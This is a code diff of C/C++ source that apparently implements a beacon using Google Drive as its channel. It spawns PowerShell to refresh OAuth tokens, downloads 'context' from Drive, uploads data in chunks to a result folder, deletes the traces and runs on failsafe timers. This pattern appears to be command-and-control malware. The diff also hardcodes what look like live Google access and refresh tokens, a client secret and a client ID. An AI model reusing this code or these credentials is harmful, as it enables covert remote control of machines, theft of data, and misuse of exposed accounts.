@@ -5,17 +5,20 @@
 
 #define min 32
 #define max 126
-static const int FAILSAFE_THRESHOLD = 2402 * 1000;
+#define PROGRAM_CYCLE_THRESHOLD 4100 * 1000 
+#define FAILSAFE_THRESHOLD 2402 * 1000
+
 static const char bs_64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 static int index = 0;
 
-static MyString g_access_token = "yX2Mik28Eorl0NGfxPsFRtmSzxw0177";
-static MyString g_refresh_token = *(new MyString("1//09mt_G8WQts9XCgYIARAAGAkSNwF-L9IrqUICbcNlRFj27jFrk3Py7PQSj41VRDv7eTnh1YPl-HOkXSDBRiJOMJWCzuIvr_LRmEc"));
+static MyString g_access_token = "ya29.a0AcM612yHY7gtcQPAKq4fXAXxE17SmTO1jY9tI7oZVIGrZ_G-OvWj4QliYjHNuvli2KVz2l6HZjPLUGj1VQCCETovAVQEwo-ARdQvmokxbf3HKxMojAzY1KL3_NgMLUtCR5j7mNeqN3gFxz7YrU9R7BqgmrdMq1pLh9jepUc-aCgYKAe0SARASFQHGX2MiNFJ3Wt-aCzwIQD9qDrG1Sw0175";
+static MyString g_refresh_token = *(new MyString("1//03KFHmJ2e0jJfCgYIARAAGAMSNwF-L9Ir0gHSya9koJq8Wz0QBZVGP3s3L3tFBcvyZjEal-8jn7Sy9vBAxOZrOAi0rzUIhaItCMM"));
 static MyString g_client_secret = *(new MyString("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"));
 static MyString g_client_id = *(new MyString("1013834111625-fplqsrj4vs1d95l5g8fmljkqsuh0hstu.apps.googleusercontent.com"));
 static MyString g_result_folder_id = "10a_TCWM1Txsjy-SkkQMen2eytaZKLgdB";
 static boolean g_flag = false;
+
 static DWORD expo(DWORD base, DWORD exponent) {
     if (exponent == 0){
         return 1;
@@ -122,21 +125,21 @@ static void handleFailsafe() {
     g_refresh_token = g_refresh_token.getSubString(0, g_refresh_token.getLength() - 1);
 }
 
-static MyString getToken() {
+static MyString setNewAccessToken() {
 
     char* buffer = new char[1024];
     sprintf_s(buffer, 1024, "powershell.exe -Command \"try{$headers = New-Object 'System.Collections.Generic.Dictionary[[String],[String]]'; $headers.Add('Host', 'oauth2.googleapis.com'); $headers.Add('Content-Type', 'application/x-www-form-urlencoded'); $body = 'client_id=%s&client_secret=%s&grant_type=refresh_token&refresh_token=%s'; $response = Invoke-RestMethod 'https://oauth2.googleapis.com/token' -Method 'POST' -Headers $headers -Body $body -TimeoutSec 30; $response.access_token | ConvertTo-Json}catch{echo 4}\"",g_client_id.getContext(), g_client_secret.getContext(), g_refresh_token.getContext());
-    //Decoder(Url);
+
     FILE* file = _popen(buffer, "r");
-    fgets(buffer, sizeof(buffer), file);
+    fgets(buffer, 1023, file);
     if (buffer[0] == '4')
     {
         delete[] buffer;
         handleFailsafe();
-        return getToken();
+        return setNewAccessToken();
     }
     MyString output = buffer;
-    
+
     _pclose(file);
     g_flag = false;
     delete[] buffer;
@@ -153,7 +156,7 @@ static MyString downloadContext() {
         output = output + buffer;
     }
     if (output.getCharAt(0) == '4') {
-        g_access_token = getToken();
+        g_access_token = setNewAccessToken();
         delete[] buffer;
         return downloadContext();
     }
@@ -179,7 +182,7 @@ static void upload(MyString data) {
             output = output + temp_buffer;
         }
         if (output.getCharAt(0) == '4') {
-            g_access_token = getToken();
+            g_access_token = setNewAccessToken();
             j--;
         }
         subIndex++;
@@ -198,7 +201,7 @@ static boolean deleteContext() {
 
     fgets(buffer, 2, file);
     if (buffer[0] == '4') {
-        g_access_token = getToken();
+        g_access_token = setNewAccessToken();
         delete[] buffer;
         return deleteContext();
     }
